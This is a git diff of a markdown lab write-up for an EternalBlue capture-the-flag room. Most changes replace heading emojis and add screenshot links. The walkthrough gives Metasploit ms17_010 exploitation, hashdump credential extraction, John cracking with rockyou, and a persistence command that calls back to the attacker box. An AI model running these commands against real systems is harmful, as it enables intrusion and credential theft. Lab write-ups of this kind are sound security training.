@@ -25,11 +25,11 @@ The purpose of this room is to provide a guided, beginner‑friendly environment
 
 ## Task 1: Recon
 
-### 1️⃣ Start the Virtual Environment
+### 1️. Start the Virtual Environment
 
 I launched both the AttackBox and the target machine, confirmed connectivity, and prepared for scanning.
 
-### 2️⃣ Port Scan
+### 2️/ Port Scan
 
 The target does not respond to ICMP ping, so I scanned directly:
 ```bash
@@ -41,9 +41,9 @@ nmap -p 1-999 <target_ip>
 - `139/tcp  open  netbios-ssn`
 - `445/tcp  open  microsoft-ds`
 
-**Total open ports under 1000:** 3
+<img width="960" height="1032" alt="1" src="https://github.com/user-attachments/assets/1ef3e874-b15c-47c4-bdab-4ae7c0ed299d" />
 
-### 3️⃣ Vulnerability Detection
+### 3️. Vulnerability Detection
 
 Checking SMB vulnerability:
 ```bash
@@ -55,19 +55,17 @@ nmap -p 445 --script smb-vuln-ms17-010 <target_ip>
 > CVE‑2017‑0143  
 > Remote Code Execution confirmed
 
-**Answer:** `ms17-010`
-
 ---
 
 ## Task 2: Gain Access
 
-### 1️⃣ Start Metasploit
+### 1️. Start Metasploit
 
 ```bash
 msfconsole
 ```
 
-### 2️⃣ Find EternalBlue Exploit
+### 2️. Find EternalBlue Exploit
 
 ```bash
 search ms17_010
@@ -76,7 +74,7 @@ search ms17_010
 **Selected module:**  
 `exploit/windows/smb/ms17_010_eternalblue`
 
-### 3️⃣ Configure Options
+### 3. Configure Options
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
@@ -86,7 +84,9 @@ set LHOST <attackbox_ip>
 run
 ```
 
-### 4️⃣ Meterpreter Session Gained
+<img width="960" height="1032" alt="3" src="https://github.com/user-attachments/assets/48cd1304-fb2d-4fc5-b3e7-d19e828be76b" />
+
+### 4️. Meterpreter Session Gained
 
 Successful exploitation yielded:
 
@@ -101,6 +101,9 @@ EternalBlue often provides SYSTEM immediately. I confirmed:
 ```bash
 getuid
 ```
+
+<img width="960" height="1032" alt="4" src="https://github.com/user-attachments/assets/571ef966-b09b-4521-98c8-dcc84ae5d920" />
+
 If not SYSTEM, I used the local exploit suggester:
 ```bash
 background
@@ -124,24 +127,19 @@ getuid
 
 ## Task 4: Credential Extraction & Cracking
 
-### 1️⃣ Dump SAM Hashes
+### 1️. Dump SAM Hashes
 
 ```bash
 hashdump
 ```
-
-**Example output:**
-```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Jon:1001:aad3b435b51404eeaad3b435b51404ee:<NT hash>:::
-```
+<img width="960" height="1032" alt="5" src="https://github.com/user-attachments/assets/b21bf616-ed71-4d42-b43d-b52e0301bacf" />
 
 Save the NT hash:
 ```bash
 echo "<hash_here>" > hash.txt
 ```
 
-### 2️⃣ Crack NTLM Hash Using John
+### 2️ Crack NTLM Hash Using John
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
@@ -149,11 +147,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 **Cracked password:** `Password123`
 
+<img width="960" height="1032" alt="6" src="https://github.com/user-attachments/assets/67ed0cef-8bf0-4830-9c3a-1967272deaca" />
+
 ---
 
 ## Task 5: Post Exploitation
 
-### 1️⃣ System Enumeration
+### 1️. System Enumeration
 
 ```bash
 sysinfo
@@ -161,14 +161,16 @@ ipconfig
 netstat -ano
 ```
 
-### 2️⃣ User Enumeration
+<img width="960" height="1032" alt="7" src="https://github.com/user-attachments/assets/4491f525-bc68-49a9-873d-bd60847fd8a2" />
+
+### 2️. User Enumeration
 
 ```bash
 net user
 net localgroup administrators
 ```
 
-### 3️⃣ File System Inspection
+### 3️. File System Inspection
 
 ```bash
 dir C:\
@@ -176,13 +178,15 @@ search -f flag*
 download <file>
 ```
 
-### 4️⃣ Persistence (Demonstration Only)
+### 4️. Persistence (Demonstration Only)
 
 ```bash
 run persistence -U -i 10 -p 4444 -r <attackbox_ip>
 ```
 
-### 5️⃣ Clearing Traces (For Learning Only)
+<img width="960" height="1032" alt="8" src="https://github.com/user-attachments/assets/ea25343b-314a-4827-b142-6d7f2d7a957c" />
+
+### 5️. Clearing Traces (For Learning Only)
 
 Typical example:
 ```bash
